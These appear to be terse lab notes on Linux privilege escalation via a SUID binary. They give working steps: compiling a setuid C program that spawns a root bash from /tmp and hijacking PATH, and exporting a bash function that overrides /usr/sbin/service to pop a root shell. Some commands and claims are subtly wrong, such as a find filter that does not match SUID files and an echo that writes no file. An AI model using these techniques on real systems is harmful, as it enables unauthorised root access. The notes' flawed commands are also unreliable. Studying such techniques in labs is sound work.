#find 
1) 
```shell
find / -type f -perm -0400 -ls 2>/dev/null 
```

If the environment variables initiated with set user id (SUID). then it is malicious on the machine.

![[Pasted image 20230808143805.png]]

2) checking the `suid-env` binary file using strings 
	![[Pasted image 20230808143946.png|400]]
3) `print $PATH` - here the first path has been mentioned as local/bin which the suid-env file place. what if we changed the path to diff which the malicious file was saved.
	![[Pasted image 20230808144117.png]]
4) created Malicious payload under name of service to gain the root shell.
	 ```shell
	 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }'
```
5) saving and compiling the file in temp folder
	```shell
	gcc /tmp/service.c -o /tmp/service
```
6) changed the path to `export PATH=/tmp:$PATH`. Here the tmp has been called first as the malicious file.
	![[Pasted image 20230808145101.png]]

**Another method**

1) creating an function and tries to execute it.
	```shell
	function /usr/sbin/service() {cp /bin/bash /tmp && chmod +x /tmp/bash && /tmp/bash -p; }
```
2) then export the shell `export -f /usr/sbin/service`
3) After running the suid-env file, you get the pop out of root shell
	 ![[Pasted image 20230808145741.png]]